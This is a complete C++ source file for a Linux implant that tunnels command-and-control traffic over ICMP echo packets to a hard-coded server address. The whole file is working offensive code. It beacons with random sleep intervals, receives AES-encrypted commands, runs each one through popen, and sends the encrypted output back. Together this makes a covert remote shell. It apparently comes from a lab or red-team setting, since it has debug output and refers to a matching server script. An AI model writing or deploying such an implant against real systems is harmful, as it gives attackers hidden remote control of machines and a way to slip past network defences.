#include <linux/icmp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <cstring>
#include <cstdint>
#include <ctime>
#include <string>
#include <vector>
#include <iostream>
#include <openssl/evp.h>
#include <openssl/rand.h>

// ── Configuration ─────────────────────────────────────────────────────────────
static constexpr const char* C2_IP   = "10.10.14.74";
static constexpr int BEACON_MIN      = 3;
static constexpr int BEACON_MAX      = 20;
static constexpr size_t MAX_OUT      = 0xFFFF;

// ── AES-256 Key — must match server.py ───────────────────────────────────────
static constexpr uint8_t AES_KEY[32] = {
    0x60, 0x3d, 0xeb, 0x10, 0x15, 0xca, 0x71, 0xbe,
    0x2b, 0x73, 0xae, 0xf0, 0x85, 0x7d, 0x77, 0x81,
    0x1f, 0x35, 0x2c, 0x07, 0x3b, 0x61, 0x08, 0xd7,
    0x2d, 0x98, 0x10, 0xa3, 0x09, 0x14, 0xdf, 0xf4
};

// ── Protocol ──────────────────────────────────────────────────────────────────
static constexpr uint8_t MAGIC[4] = { 0xDE, 0xAD, 0xBE, 0xEF };

enum MsgType : uint8_t {
    MSG_BEACON = 0x01,
    MSG_CMD    = 0x02,
    MSG_OUTPUT = 0x03,
    MSG_ACK    = 0x04
};

// ── AES-256-CBC ───────────────────────────────────────────────────────────────

// Returns IV (16B) + ciphertext
static std::vector<uint8_t> aes_encrypt(const uint8_t* data, size_t len) {
    std::vector<uint8_t> out(16 + len + 16); // IV + data + padding block
    uint8_t iv[16];
    RAND_bytes(iv, sizeof(iv));
    memcpy(out.data(), iv, 16);

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, AES_KEY, iv);

    int outl = 0, final_outl = 0;
    EVP_EncryptUpdate(ctx, out.data() + 16, &outl, data, (int)len);
    EVP_EncryptFinal_ex(ctx, out.data() + 16 + outl, &final_outl);
    EVP_CIPHER_CTX_free(ctx);

    out.resize(16 + outl + final_outl);
    return out;
}

// Expects IV (16B) + ciphertext, returns plaintext
static std::vector<uint8_t> aes_decrypt(const uint8_t* data, size_t len) {
    if (len < 17) return {};
    const uint8_t* iv         = data;
    const uint8_t* ciphertext = data + 16;
    size_t ct_len             = len - 16;

    std::vector<uint8_t> out(ct_len + 16);
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, AES_KEY, iv);

    int outl = 0, final_outl = 0;
    EVP_DecryptUpdate(ctx, out.data(), &outl, ciphertext, (int)ct_len);
    int ret = EVP_DecryptFinal_ex(ctx, out.data() + outl, &final_outl);
    EVP_CIPHER_CTX_free(ctx);

    if (ret != 1) {
        std::cout << "[ERR] AES decrypt failed (bad key or corrupt data)" << std::endl;
        return {};
    }

    out.resize(outl + final_outl);
    return out;
}

// ── Checksum ──────────────────────────────────────────────────────────────────
static uint16_t inet_cksum(const void* buf, size_t len) {
    const uint16_t* p = (const uint16_t*)buf;
    uint32_t sum = 0;
    while (len > 1) { sum += *p++; len -= 2; }
    if (len)          sum += *(const uint8_t*)p;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return ~sum;
}

// ── Protocol helpers ──────────────────────────────────────────────────────────
static std::vector<uint8_t> build_payload(uint32_t sid, MsgType t,
    const uint8_t* d = nullptr, uint16_t dlen = 0)
{
    std::vector<uint8_t> p;
    p.insert(p.end(), MAGIC, MAGIC + 4);
    for (int i = 3; i >= 0; i--) p.push_back((sid >> (8 * i)) & 0xFF);
    p.push_back((uint8_t)t);
    p.push_back((dlen >> 8) & 0xFF);
    p.push_back(dlen & 0xFF);
    if (d && dlen) p.insert(p.end(), d, d + dlen);
    return p;
}

struct Parsed {
    bool ok = false;
    uint32_t sid = 0;
    MsgType type{};
    std::vector<uint8_t> data;
};

static Parsed parse_payload(const uint8_t* buf, size_t len) {
    Parsed r;
    if (len < 11 || memcmp(buf, MAGIC, 4) != 0) return r;
    r.sid = ((uint32_t)buf[4] << 24) | ((uint32_t)buf[5] << 16) |
            ((uint32_t)buf[6] << 8)  |  (uint32_t)buf[7];
    r.type = (MsgType)buf[8];
    uint16_t dlen = ((uint16_t)buf[9] << 8) | buf[10];
    if (len < 11u + dlen) return r;
    r.data.assign(buf + 11, buf + 11 + dlen);
    r.ok = true;
    return r;
}

// ── Beacon ────────────────────────────────────────────────────────────────────
class ICMPBeacon {
    int         sock;
    sockaddr_in c2;
    uint32_t    sid;
    uint16_t    seq = 0;
    uint16_t    beacon_id;

public:
    ICMPBeacon(const std::string& c2_ip) {
        srand(time(nullptr) ^ getpid());
        if (geteuid() == 0) setuid(0);

        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock < 0) { perror("socket"); exit(1); }

        memset(&c2, 0, sizeof(c2));
        c2.sin_family = AF_INET;
        inet_pton(AF_INET, c2_ip.c_str(), &c2.sin_addr);

        sid       = (uint32_t)(time(nullptr)) ^ (uint32_t)getpid();
        beacon_id = (uint16_t)(getpid() & 0xFFFF);

        std::cout << "[DBG] SID=" << std::hex << sid
                  << "  ICMP_ID=" << beacon_id << std::dec << std::endl;
    }

    void send_msg(MsgType t, const uint8_t* d = nullptr, uint16_t dlen = 0) {
        // Encrypt data if present
        std::vector<uint8_t> enc;
        const uint8_t* final_d    = d;
        uint16_t       final_dlen = dlen;

        if (d && dlen > 0) {
            enc        = aes_encrypt(d, dlen);
            final_d    = enc.data();
            final_dlen = (uint16_t)enc.size();
        }

        auto payload = build_payload(sid, t, final_d, final_dlen);
        size_t pkt_size = sizeof(icmphdr) + payload.size();
        std::vector<uint8_t> pkt(pkt_size, 0);

        icmphdr* hdr = (icmphdr*)pkt.data();
        hdr->type             = ICMP_ECHO;
        hdr->code             = 0;
        hdr->un.echo.id       = htons(beacon_id);
        hdr->un.echo.sequence = htons(seq++);
        memcpy(pkt.data() + sizeof(icmphdr), payload.data(), payload.size());
        hdr->checksum = inet_cksum(pkt.data(), pkt_size);

        sendto(sock, pkt.data(), pkt_size, 0, (sockaddr*)&c2, sizeof(c2));
    }

    Parsed recv_reply() {
        uint8_t buf[65535];
        sockaddr_in src;
        socklen_t src_len = sizeof(src);

        while (true) {
            int n = recvfrom(sock, buf, sizeof(buf), 0,
                             (sockaddr*)&src, &src_len);
            if (n < 0) continue;

            struct iphdr* ip = (struct iphdr*)buf;
            int ip_hdr_len   = ip->ihl * 4;
            if (n < ip_hdr_len + (int)sizeof(icmphdr)) continue;

            icmphdr* hdr = (icmphdr*)(buf + ip_hdr_len);
            if (hdr->type != ICMP_ECHOREPLY) continue;
            if (src.sin_addr.s_addr != c2.sin_addr.s_addr) continue;

            const uint8_t* pay = buf + ip_hdr_len + sizeof(icmphdr);
            size_t pay_len     = n - ip_hdr_len - sizeof(icmphdr);

            Parsed p = parse_payload(pay, pay_len);
            if (!p.ok) continue;
            if (p.type == MSG_BEACON) continue;
            if (p.sid != sid) continue;

            return p;
        }
    }

    void run() {
        std::cout << "[*] Beacon started, C2="
                  << inet_ntoa(c2.sin_addr) << std::endl;

        while (true) {
            send_msg(MSG_BEACON);
            std::cout << "[DBG] BEACON sent" << std::endl;

            Parsed p = recv_reply();

            if (p.type == MSG_ACK) {
                int jitter = BEACON_MIN + rand() % (BEACON_MAX - BEACON_MIN + 1);
                std::cout << "[DBG] ACK, sleeping " << jitter << "s" << std::endl;
                sleep(jitter);
                continue;
            }

            if (p.type == MSG_CMD) {
                // Decrypt the command
                auto dec = aes_decrypt(p.data.data(), p.data.size());
                if (dec.empty()) {
                    std::cout << "[ERR] Failed to decrypt CMD, skipping" << std::endl;
                    continue;
                }
                std::string cmd(dec.begin(), dec.end());
                std::cout << "[DBG] CMD: " << cmd << std::endl;

                FILE* pipe = popen(cmd.c_str(), "r");
                std::string output;
                if (pipe) {
                    char tmp[4096];
                    while (fgets(tmp, sizeof(tmp), pipe))
                        output += tmp;
                    pclose(pipe);
                }
                if (output.empty()) output = "[no output]\n";

                size_t out_len = std::min(output.size(), MAX_OUT);
                send_msg(MSG_OUTPUT,
                    (const uint8_t*)output.data(),
                    (uint16_t)out_len);
                std::cout << "[DBG] OUTPUT sent: " << out_len << "B (encrypted)" << std::endl;

                int jitter = BEACON_MIN + rand() % (BEACON_MAX - BEACON_MIN + 1);
                std::cout << "[DBG] Sleeping " << jitter << "s" << std::endl;
                sleep(jitter);
            }
        }
    }

    ~ICMPBeacon() { close(sock); }
};

int main() {
    ICMPBeacon beacon(C2_IP);
    beacon.run();
}
